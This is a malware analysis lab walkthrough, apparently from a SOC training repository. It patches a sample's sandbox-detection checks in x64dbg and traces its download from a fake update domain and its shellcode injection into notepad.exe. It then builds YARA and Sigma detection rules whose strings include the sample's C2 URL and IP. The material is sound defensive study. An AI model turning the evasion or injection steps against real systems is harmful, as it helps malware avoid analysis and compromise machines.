Given that sandbox checks hinder the malware's direct execution on the machine, we need to patch these checks to circumvent the sandbox detection. Here's how we can dodge sandbox detection checks while debugging with x64dbg. Several methods can lead us to the instructions where sandbox detection is performed. We will discuss a few of these

**By Copying the Address from IDA**


During code analysis, we observed the sandbox detection check related to the registry key. We can extract the address of the first cmp instruction directly from IDA.

To find the address, let's revert to the IDA windows, open the first function we had renamed as assumed_Main, and look for the cmp instruction. To view the addresses, we can transition from graph view to text view by pressing the spacebar button.

This exposes the address (as highlighted in the below screenshot)

We can copy the address 00000000004032C8 from IDA.


```
Code: ida

.text:00000000004032C8                 cmp     [rsp+148h+Type], 1
```

In x64dbg, we can right-click anywhere on the disassembly view (CPU) and select Go to > Expression. Alternatively, we can press Ctrl+G (go to expression) as a shortcut.

**We can enter the copied address here, as shown in the screenshot. This navigates us to the comparison instruction where we can implement changes.**


![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/7d7f9cdf-2c3b-414b-888f-32dcc177471e)

**By Searching Through the Strings.**

Let's look for Sandbox detected in the String references, and set a breakpoint, so that when we hit run, the execution should pause at this point.

To do this, first **click on the Run button once and then right-click anywhere on the disassembly view, and choose Search for > Current Module > String references.**
![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/78873be1-e300-4559-8883-496396e9c7df)


Next, we can add a breakpoint to mark the location, then study the instructions before this Sandbox MessageBox to discern how the jump was made to the instruction printing Sandbox detected.

**Let's start by adding a breakpoint at the last Sandbox detected string as follows.**


![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/bc56caa0-3789-44ab-82b7-f096ae54bbd9)

**We can then double-click on the string to go to the address where the instructions to print Sandbox detected are located.**


![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/dc84d8b0-04e8-4c5e-b89c-a12a121277e6)


As observed, a cmp instruction is present above this MessageBox which compares the value with 1 after a registry path comparison has been performed. Let's modify this comparison value to match with 0 instead. This can be done by placing the cursor on that instruction and pressing Spacebar on the keyboard. This allows us to edit the assembly code instructions.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/69520653-b10d-43ff-b761-8e411692e352)


We can change the comparison value of 0x1 to 0x0. Changing the comparison to 0 may shift the control flow of the code, and it should not jump to the address where MessageBox is displayed.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/d3b001ba-9a08-4ae3-a745-1b652084fb9f)

Upon clicking on Run in x64dbg or pressing F9, it won't hit the breakpoint for the first sandbox detection message code. This means that we successfully patched the instructions.

In a similar manner, we can add a breakpoint on the next sandbox detection function before it prints a MessageBox as well. To do that, the breakpoint should be placed at the second to last Sandbox detected string (0000000000402F13). If we double-click this string we will notice there's a jump instruction which we can skip, directing the execution flow to the next instruction that calls another function. That's exactly what we need – instead of the sandbox detection MessageBox, it jumps to another function.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/e1f67077-59ec-43a3-a27a-081f78ff5f0e)

We can alter the instruction from je shell.402F09 to jne shell.402F09.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/299d8f1a-7526-4510-aa5b-ed9f67e6cd46)

shell.exe performs sandbox detection by checking for internet connectivity. This section's target doesn't have internet connectivity. For this reason we should patch this sandbox detection method as well. We can do that by clicking on the first Sandbox detected string (0000000000402CBD) and patching the following instruction.


![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/49939089-749d-4de8-b960-4dd415db7b2e)

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/4e133e33-baf0-4484-b67f-79c846ced415)


Now, when we press Run, the patched shell.exe proceeds further, downloads the default executable from INetSim, and executes it.


![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/c051a2a8-3fe1-4b62-b9f7-2d1e1505044f)

With the sandbox checks bypassed, the actual functionality is unveiled. We can save the patched executable by pressing Ctrl+P and clicking on Patch File. This action stores the patched file, which skips the sandbox checks.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/267dbd89-8cab-4741-814b-c3948424bda2)



We undertake this process to ensure that the next time we run the saved patched file, it executes directly without the sandbox checks, and we can observe all the events in ProcessMonitor.

Let's now employ Wireshark, to capture and examine the network traffic generated by the malware. Be mindful of the color-coded traffic: red corresponds to client-to-server traffic, while blue denotes the server-to-client exchanges.

Examining the HTTP Request reveals that the malware sample appends the computer hostname to the user agent field (in this case it was RDSEMVM01).

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/194369a1-36d8-4275-bd0f-7b7bcc41e79a)


When inspecting the HTTP Response, it becomes evident that InetSim has returned its default binary as a response to the malware.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/63a5dbd5-6ca2-403a-aa70-1bb04e76a735)

The malware's request for svchost.exe solicits the default binary from InetSim. This binary responds with a MessageBox featuring the message: This is the INetSim default binary.

Additionally, DNS requests for a random domain and the address ms-windows-update[.]com were sent by the malware, with INetSim responding with fake responses (in this case INetSim was running on 10.10.10.100).


![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/6ff3a0b3-75dd-43ab-8d3f-0e44fa5c1637)



### Analyzing Process Injection & Memory Region


On the journey of code analysis, we discovered that our executable performs process injection on notepad.exe and displays a MessageBox stating Connection sent to C2.

To probe deeper into the process injection, we propose setting breakpoints at WINAPI functions VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread. These breakpoints will allow us to scrutinize the content held in the registers during the process injection. Here's the procedure to set these breakpoints:

- Access the x64dbg interface and navigate to the Symbols tab, located at the top.
- In the symbol search box, search for the desired DLL name on the left and function names, such as VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread, on the right within the Kernel32.dll DLL.
- As the function names materialize in the search results, right-click and select Toggle breakpoint from the context menu for each function. An alternative shortcut is to press F2.


**Executing these steps sets a breakpoint at each function's entry point. We'll replicate these steps for all the functions we intend to scrutinize.**

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/2abe372d-758d-43fc-9f91-a1567cfa09b8)

After setting breakpoints, we press F9 or select Run from the toolbar until we reach the breakpoint for WriteProcessMemory. Up until this moment, notepad has been launched, but the shellcode has not yet been written into notepad's memory.

**Attaching Another Running Process In x64dbg**

In order to delve further, let's open another instance of x64dbg and attach it to notepad.exe.

- Start a new instance of x64dbg.
- Navigate to the File menu and select Attach or use the Alt + A keyboard shortcut.
- In the Attach dialog box, a list of running processes will appear. Choose notepad.exe from the list.
- Click the Attach button to begin the attachment process.

Once the attachment is successful, x64dbg initiates the debugging of the target process, and the main window displays the assembly code along with other debugging information.

**Now, we can establish breakpoints, step through the code, inspect registers and memory, and study the behavior of the attached notepad.exe process using x64dbg.**

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/24933592-444a-4516-bb53-ca62be8fd7df)


The 2nd argument of WriteProcessMemory is lpBaseAddress which contains a pointer to the base address in the specified process to which data is written. In our case, it should be in the RDX register.


![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/71db5a02-0b8d-41c3-b296-3957313b2b85)

When invoking the WriteProcessMemory function, the rdx register holds the lpBaseAddress parameter. This parameter represents the address within the target process's address space where the data will be written.

We aim to examine the registers when the WriteProcessMemory function is invoked in the x64dbg instance running the shell.exe process. This will reveal the address within notepad.exe where the shellcode will be written.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/4f035eb4-aeb1-4b4f-a99d-d71e4875afc2)

We copy this address to examine its content in the memory dump of the attached notepad.exe process in the second x64dbg instance.

We now select Go to > Expression by right-clicking anywhere on the memory dump in the second x64dbg instance running notepad.exe.

With the copied address entered, the content at this address is displayed (by right-clicking on the address and choosing Follow in Dump > Selected Address), which currently is empty.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/296c996f-b837-46da-bbea-bb0a2f80d7a1)


Next, we execute shell.exe in the first x64dbg instance by clicking on the Run button. We observe what is inscribed into this memory region of notepad.exe.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/5cfd8646-632a-4b7e-bd8a-5e9fe6f6c616)


Following its execution, we identify the injected shellcode, which aligns with what we discovered earlier during code analysis. We can verify this in Process Hacker and save it to a file for subsequent examination.


# Creating Detection Rules

Having now uncovered the Tactics, Techniques, and Procedures (TTPs) employed by this malware, we can proceed to design detection rules, such as Yara and Sigma rules.

> [!TIP]
> While we will begin to delve into the concepts of Yara and Sigma rule development in this section, we'll only scratch the surface. These are extensive topics with a lot of depth, necessitating a comprehensive study. Hence, we will be dedicating a complete module named 'YARA & Sigma for SOC Analysts' to help you truly master these crucial areas of cyber defense.

## Yara

YARA (Yet Another Recursive Acronym), a widely used open-source pattern matching tool and rule-based malware detection and classification framework let's us create custom rules to spot specific patterns or characteristics in files, processes, or memory. To draft a YARA rule for our sample, we'll need to examine the behavior, features, or specific strings/patterns unique to the sample we aim to detect.

Here's a simple example of a YARA rule that matches the presence of the string Sandbox detected in a process. We remind you that shell.exe demonstrated such behavior.

```
Code: yara

rule Shell_Sandbox_Detection {
    strings:
        $sandbox_string = "Sandbox detected"
    condition:
        $sandbox_string
}

```
**Now let's add a lot more strings and patterns into the rule to make it better.**

We can utilize the yarGen tool, which automates the process of generating YARA rules, with the prime objective of crafting the best possible rules for manual post-processing. This, however, necessitates a shrewd automatic preselection and a discerning human analyst to generate a robust rule.

First let's create a new directory called Test inside the /home/htb-student/Samples/MalwareAnalysis directory of this section's target and then let's copy shell.exe (residing in the /home/htb-student/Samples/MalwareAnalysis directory) to the newly created Test directory as follows.

```
$ mkdir /home/htb-student/Samples/MalwareAnalysis/Test
```

```
$ cp /home/htb-student/Samples/MalwareAnalysis/shell.exe /home/htb-student/Samples/MalwareAnalysis/Test/
```

**To automatically create a Yara rule for shell.exe we should execute the following (inside the /home/htb-student/yarGen-0.23.4 directory).**

```
$ sudo python3 yarGen.py -m /home/htb-student/Samples/MalwareAnalysis/Test/
------------------------------------------------------------------------
                   _____            
    __ _____ _____/ ___/__ ___      
   / // / _ `/ __/ (_ / -_) _ \     
   \_, /\_,_/_/  \___/\__/_//_/     
  /___/  Yara Rule Generator        
         Florian Roth, July 2020, Version 0.23.3
   
  Note: Rules have to be post-processed
  See this post for details: https://medium.com/@cyb3rops/121d29322282
------------------------------------------------------------------------
[+] Using identifier 'Test'
[+] Using reference 'https://github.com/Neo23x0/yarGen'
[+] Using prefix 'Test'
[+] Processing PEStudio strings ...
[+] Reading goodware strings from database 'good-strings.db' ...
    (This could take some time and uses several Gigabytes of RAM depending on your db size)
[+] Loading ./dbs/good-imphashes-part3.db ...
[+] Total: 4029 / Added 4029 entries
[+] Loading ./dbs/good-strings-part9.db ...
[+] Total: 788 / Added 788 entries
[+] Loading ./dbs/good-strings-part8.db ...
[+] Total: 332082 / Added 331294 entries
[+] Loading ./dbs/good-imphashes-part4.db ...
[+] Total: 6426 / Added 2397 entries
[+] Loading ./dbs/good-strings-part2.db ...
[+] Total: 1703601 / Added 1371519 entries
[+] Loading ./dbs/good-exports-part2.db ...
[+] Total: 90960 / Added 90960 entries
[+] Loading ./dbs/good-strings-part4.db ...
[+] Total: 3860655 / Added 2157054 entries
[+] Loading ./dbs/good-exports-part4.db ...
[+] Total: 172718 / Added 81758 entries
[+] Loading ./dbs/good-exports-part7.db ...
[+] Total: 223584 / Added 50866 entries
[+] Loading ./dbs/good-strings-part6.db ...
[+] Total: 4571266 / Added 710611 entries
[+] Loading ./dbs/good-strings-part7.db ...
[+] Total: 5828908 / Added 1257642 entries
[+] Loading ./dbs/good-exports-part1.db ...
[+] Total: 293752 / Added 70168 entries
[+] Loading ./dbs/good-exports-part3.db ...
[+] Total: 326867 / Added 33115 entries
[+] Loading ./dbs/good-imphashes-part9.db ...
[+] Total: 6426 / Added 0 entries
[+] Loading ./dbs/good-exports-part9.db ...
[+] Total: 326867 / Added 0 entries
[+] Loading ./dbs/good-imphashes-part5.db ...
[+] Total: 13764 / Added 7338 entries
[+] Loading ./dbs/good-imphashes-part8.db ...
[+] Total: 13947 / Added 183 entries
[+] Loading ./dbs/good-imphashes-part6.db ...
[+] Total: 13976 / Added 29 entries
[+] Loading ./dbs/good-strings-part1.db ...
[+] Total: 6893854 / Added 1064946 entries
[+] Loading ./dbs/good-imphashes-part7.db ...
[+] Total: 17382 / Added 3406 entries
[+] Loading ./dbs/good-exports-part6.db ...
[+] Total: 328525 / Added 1658 entries
[+] Loading ./dbs/good-imphashes-part2.db ...
[+] Total: 18208 / Added 826 entries
[+] Loading ./dbs/good-exports-part8.db ...
[+] Total: 332359 / Added 3834 entries
[+] Loading ./dbs/good-strings-part3.db ...
[+] Total: 9152616 / Added 2258762 entries
[+] Loading ./dbs/good-strings-part5.db ...
[+] Total: 12284943 / Added 3132327 entries
[+] Loading ./dbs/good-imphashes-part1.db ...
[+] Total: 19764 / Added 1556 entries
[+] Loading ./dbs/good-exports-part5.db ...
[+] Total: 404321 / Added 71962 entries
[+] Processing malware files ...
[+] Processing /home/htb-student/Samples/MalwareAnalysis/Test/shell.exe ...
[+] Generating statistical data ...
[+] Generating Super Rules ... (a lot of magic)
[+] Generating Simple Rules ...
[-] Applying intelligent filters to string findings ...
[-] Filtering string set for /home/htb-student/Samples/MalwareAnalysis/Test/shell.exe ...
[=] Generated 1 SIMPLE rules.
[=] All rules written to yargen_rules.yar
[+] yarGen run finished
```

**We will notice that a file named yargen_rule.yar is generated by yarGen that incorporates unique strings, which are automatically extracted and inserted into the rule.**

```
$ cat yargen_rules.yar 
/*
   YARA Rule Set
   Author: yarGen Rule Generator
   Date: 2023-08-02
   Identifier: Test
   Reference: https://github.com/Neo23x0/yarGen
*/

/* Rule Set ----------------------------------------------------------------- */

rule _home_htb_student_Samples_MalwareAnalysis_Test_shell {
   meta:
      description = "Test - file shell.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-08-02"
      hash1 = "bd841e796feed0088ae670284ab991f212cf709f2391310a85443b2ed1312bda"
   strings:
      $x1 = "C:\\Windows\\System32\\cmd.exe" fullword ascii
      $s2 = "http://ms-windows-update.com/svchost.exe" fullword ascii
      $s3 = "C:\\Windows\\System32\\notepad.exe" fullword ascii
      $s4 = "/k ping 127.0.0.1 -n 5" fullword ascii
      $s5 = "iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com" fullword ascii
      $s6 = "  VirtualQuery failed for %d bytes at address %p" fullword ascii
      $s7 = "[-] Error code is : %lu" fullword ascii
      $s8 = "C:\\Program Files\\VMware\\VMware Tools\\" fullword ascii
      $s9 = "Failed to open the registry key." fullword ascii
      $s10 = "  VirtualProtect failed with code 0x%x" fullword ascii
      $s11 = "Connection sent to C2" fullword ascii
      $s12 = "VPAPAPAPI" fullword ascii
      $s13 = "AWAVAUATVSH" fullword ascii
      $s14 = "45.33.32.156" fullword ascii
      $s15 = "  Unknown pseudo relocation protocol version %d." fullword ascii
      $s16 = "AQAPRQVH1" fullword ascii
      $s17 = "connect" fullword ascii /* Goodware String - occured 429 times */
      $s18 = "socket" fullword ascii /* Goodware String - occured 452 times */
      $s19 = "tSIcK<L" fullword ascii
      $s20 = "Windows-Update/7.6.7600.256 %s" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 60KB and
      1 of ($x*) and 4 of them
}
```

We can review the rule and modify it as necessary, adding more strings and conditions to enhance its reliability and effectiveness.

## Detecting Malware Using Yara Rules

**We can then use this rule to scan a directory as follows.**

### Creating Detection Rules

```
sumedh@sumedh$ yara /home/htb-student/yarGen-0.23.4/yargen_rules.yar /home/htb-student/Samples/MalwareAnalysis/
home_htb_student_Samples_MalwareAnalysis_Test_shell /home/htb-student/Samples/MalwareAnalysis//shell.exe
```
**We will notice that shell.exe is returned!**
> [!IMPORTANT]
>  References for YARA rules

- Yara documentation : https://yara.readthedocs.io/en/stable/writingrules.html
- Yara resources - https://github.com/InQuest/awesome-yara
- The DFIR Report - https://github.com/The-DFIR-Report/Yara-Rules

## Sigma

Sigma is a comprehensive and standardized rule format extensively used by security analysts and Security Information and Event Management (SIEM) systems. The objective is to detect and identify specific patterns or behaviors that could potentially signify security threats or events. The standardized format of Sigma rules enables security teams to define and disseminate detection logic across diverse security platforms.

To construct a Sigma rule based on certain actions - for instance, dropping a file in a temporary location - we can devise a sample rule along these lines.

```
Code: sigma

title: Suspicious File Drop in Users Temp Location
status: experimental
description: Detects suspicious activity where a file is dropped in the temp location

logsource:
    category: process_creation
detection:
    selection:
        TargetFilename:
            - '*\\AppData\\Local\\Temp\\svchost.exe'
    condition: selection
    level: high

falsepositives:
    - Legitimate exe file drops in temp location

```
**In this instance, the rule is designed to identify when the file svchost.exe is dropped in the Temp directory.**

During analysis, it's advantageous to have a system monitoring agent operating continuously. In this context, we've chosen Sysmon to gather the logs. Sysmon is a powerful tool that captures detailed event data and aids in the creation of Sigma rules. Its log categories encompass process creation (EventID 1), network connection (EventID 3), file creation (EventID 11), registry modification (EventID 13), among others. The scrutiny of these events assists in pinpointing indicators of compromise (IOCs) and understanding behavior patterns, thus facilitating the crafting of effective detection rules.

For instance, Sysmon has collected logs such as process creation, process access, file creation, and network connection, among others, in response to the activities conducted by shell.exe. This compiled information proves instrumental in enhancing our understanding of the sample's behavior and developing more precise and effective detection rules.

**Process Create Logs:**

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/28b0e5c6-4543-4c85-a940-8c461d938c13)

**Process Access Logs (not configured in the Windows targets of this module):**

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/8fdfa6ee-2227-4809-a307-b922a36275d1)

**File Creation Logs:**

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/31c2cc48-0cea-4841-a430-8464ccfd61db)

**Network Connection Logs:**

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/2b777783-856e-4988-9877-622c84c592cc)


**Below are some references for Sigma rules:**

> [!IMPORTANT]
> Reference

- Sigma documentation : https://github.com/SigmaHQ/sigma/wiki/Specification
- Sigma resources - https://github.com/SigmaHQ/sigma/tree/master/rules
- The DFIR Report - https://github.com/The-DFIR-Report/Sigma-Rules/tree/main/rules






































































